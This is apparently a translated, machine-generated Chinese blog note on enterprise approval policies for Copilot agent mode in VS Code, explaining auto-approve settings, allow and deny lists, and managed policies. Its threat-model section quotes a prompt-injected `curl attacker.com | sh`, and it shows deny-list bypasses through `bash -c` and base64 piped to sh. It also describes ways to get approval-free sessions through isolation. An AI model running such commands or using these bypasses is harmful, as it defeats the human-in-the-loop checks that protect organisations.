---
audio: false
generated: true
image: false
lang: zh
layout: post
title: 企业副驾驶审批层级
translated: true
type: note
---

**问题：** VS Code GitHub Copilot agent 模式中的“允许此会话中的所有命令”选项很方便——但在企业环境中，如果策略禁用了自动批准，实际会发生什么？还有哪些选项可用？

**回答：**

是的，它很方便——它本质上是会话范围的 YOLO 模式。但需要理解其层级结构，因为在企业设置中，便捷路径是在策略层面被切断的，而不是 UI 层面。

**VS Code Copilot agent 模式中的批准层级**

大致分为四个层级，从严格到宽松：

1. **每次调用批准** — 默认设置。你需要为每个终端命令或工具调用点击继续/允许。
2. **范围批准** — “允许此会话”、“允许此工作区”，或允许特定命令模式。这就是你所描述的情况。它存在于临时会话状态或工作区设置中。
3. **允许/禁止列表** — 在 `settings.json` 中声明规则：

```jsonc
// .vscode/settings.json 或用户设置
"chat.tools.terminal.autoApprove": {
  "git status": true,
  "git log": true,
  "/^npm (test|run lint)$/": true,   // 正则形式
  "rm": false,
  "curl": false
}
```

4. **全局自动批准** — `chat.tools.global.autoApprove`，即“YOLO 模式”，批准所有操作，包括文件写入和 MCP 工具调用。

**企业环境下“禁用自动批准”的含义**

企业并非直接禁用按钮，而是通过设备级策略进行控制。`ChatToolsAutoApprove` 策略控制全局自动批准设置；将其设置为 `false` 可阻止开发者启用全局自动批准，并通过设备管理部署，从而覆盖托管设备上的用户配置设置。在托管的 VS Code 中，你会看到该设置呈灰色状态，并显示“由你的组织管理”提示，在 `settings.json` 中修改它也不会生效——在 VS Code 的设置优先级链中，策略优先于用户/工作区/文件夹设置。

这正符合你面临的银行场景：某银行客户的安全策略规定，必须有人参与，100% 批准 agent 想要运行的所有命令——这与你的环境相符。

既然你在银行工作，还有一些较新的企业策略值得了解：`ChatMCP`（禁用所有 MCP 服务器）、`ChatAgentNetworkFilter` / `ChatAgentAllowedNetworkDomains` / `ChatAgentDeniedNetworkDomains`（限制 agent 的 fetch 工具可以访问的主机），以及 `ChatAgentSandboxEnabled`（在沙箱中运行终端命令）。因此，限制范围可能远超批准按钮本身。

**在该策略下通常仍能生效的功能**

该策略针对的是全局开关。细粒度的终端允许列表（`chat.tools.terminal.autoApprove` / 旧版 `github.copilot.chat.agent.terminal.allowList`）通常仍然可用，除非组织推送了额外策略。因此，实际的企业模式是：

```jsonc
// 工作区级别：仅自动批准只读命令
"chat.tools.terminal.autoApprove": {
  "git status": true,
  "git diff": true,
  "ls": true,
  "cat": true,
  "grep": true,
  "python -m pytest": true
}
```

只读和测试命令无需点击即可执行；任何可能改变状态的操作（`rm`、`git push`、`pip install`、`curl`）仍会提示。这样既满足了安全团队要求的人工介入保证，又减少了约 80% 的批准摩擦。至于是否允许这样做，取决于你的组织是否也为此推送了策略——请检查 `code --status` 或设置 UI 中的“托管”标记。

**银行坚持这样做的深层原因**

威胁模型不是你自己，而是提示注入（prompt injection）。agent 会读取文件、网页内容和 MCP 输出；README 或抓取页面中的恶意字符串可能诱使它运行 `curl attacker.com | sh`。按命令批准是最后一道防线，因为禁止列表很容易被绕过（例如 `bash -c "rm ..."`、`echo cm0... | base64 -d | sh`）。这就是为什么“允许此会话中的所有命令”在你自己的 MacBook 上处理个人仓库时没问题，但在接触到内部代码和从互联网获取上下文的银行工作站上，确实存在危险。

如果你想在不与策略冲突的情况下获得会话级别的 YOLO 模式，一个相对被认可的方式是隔离：使用 Worktree 隔离的 Copilot CLI 会话会在代码库的隔离副本上运行，所有工具调用无需确认对话框即可自动批准——自动批准变得可以接受，因为爆炸半径被限制了。这与在 devcontainer 中使用 `--dangerously-skip-permissions` 运行 Claude Code 的理念相同：不要移除门，而是缩小门后的范围。

**参考资料：**

- [在企业管理环境中管理 AI 设置 — VS Code 文档](https://code.visualstudio.com/docs/enterprise/ai-settings)
- [Copilot 扩展治理问题 — DevOps Journal](https://devopsjournal.io/blog/2026/05/01/Copilot-extension-governance-concerns)
- [VS Code 中的 Copilot CLI 会话](https://code.visualstudio.com/docs/copilot/agents/copilot-cli)
- [无法禁用自动批准 (IntelliJ) — 银行客户问题](https://github.com/microsoft/copilot-intellij-feedback/issues/1581)